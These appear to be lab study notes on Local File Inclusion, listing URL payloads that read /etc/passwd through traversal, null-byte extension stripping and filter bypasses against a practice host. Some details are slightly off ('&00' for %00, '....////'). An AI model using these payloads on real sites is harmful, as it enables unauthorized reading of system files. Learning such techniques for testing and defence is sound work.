## Local File Inclusion
Similar to path traversal. However in Local File Inclusion (LFI), the file is passed through a language function e.g. PHP's include(), meaning any code inside the file is executed before returning the output.  
### Scenario 1: No directory specified
Just supply target file e.g. /etc/passwd  
`http://webapp.thm/index.php?file=/etc/passwd` 
### Scenario 2: Directory is specified
Use path traversal  
`http://webapp.thm/index.php?file=../../../../etc/passwd`  
  *amount of ../ is determined by path
### Scenario 3: Black-Box Testing and Appended Extensions
When you don't have access to source code, error messages become your friend.  
e.g. entry point `http://webapp.thm/index.php?lang=EN`  
submitting something invalid e.g. test returns:  
`Warning: include(languages/test.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12`  
Now we know how many ../ are needed and that .php is appended to our input  
Payload = `http://webapp.thm/index.php?lang=../../../../etc/passwd%00`  
`&00` is a null byte to remove the .php extension
### Scenario 4: Keyword Filtering
Some developers will block specific known paths e.g. /etc/passwd  
To bypass this we can append:
- `/.` or
- `%00`
### Scenario 5: Stripping ../ from input
Just double up the ../ which becomes ....//// in the payload.  
### Scenario 6: Forced Directory Prefix
Developer forces input to start with a specific directory.  
Just include the expected directory to the payload  
e.g. for application forcing `languages/`  
Payload = `http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd`
